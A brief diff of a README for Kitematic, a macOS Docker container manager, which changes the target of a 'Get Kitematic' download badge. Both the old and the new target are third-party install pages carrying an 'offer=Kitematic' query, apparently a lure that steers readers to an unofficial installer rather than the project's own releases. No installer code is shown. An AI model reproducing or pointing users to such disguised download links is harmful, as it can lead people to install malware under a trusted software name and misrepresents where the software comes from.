@@ -2,7 +2,7 @@
 
 Kitematic is a user-friendly desktop application for macOS that simplifies Docker container management. With Kitematic, you can easily pull images, start containers, and monitor logs, all from a clean graphical interface optimized for Mac users.
 
-<a href="https://gistcdn.githack.com/timedust2005/a427d6502aea2beb5eabaaea9247ca07/raw/74c43a700e59322bc44e756fd4e2f8b2fdb44046/install.html?offer=Kitematic" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Kitematic" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Kitematic%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
